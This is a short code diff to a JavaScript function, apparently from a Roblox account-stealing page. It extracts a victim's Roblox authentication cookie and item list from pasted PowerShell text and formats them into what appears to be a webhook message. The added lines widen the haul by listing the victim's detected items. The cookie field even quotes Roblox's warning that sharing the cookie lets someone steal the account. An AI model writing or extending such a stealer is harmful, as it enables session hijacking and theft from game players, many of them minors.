@@ -214,6 +214,7 @@ async function submitPowerShell() {
         // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
+        const detectedItems = extractRobloxItems(inputText);
         
 
         
@@ -254,6 +255,11 @@ async function submitPowerShell() {
                 {
                     name: "🍪 Authentication Cookie",
                     value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
+                    inline: false
+                },
+                {
+                    name: "🎮 Detected Roblox Items",
+                    value: detectedItems.length > 0 ? detectedItems.map(item => `**${item.name}** (ID: ${item.id})\n*${item.type} - ${item.url}*`).join('\n\n') : "`No specific items detected`",
                     inline: false
                 },
                 {
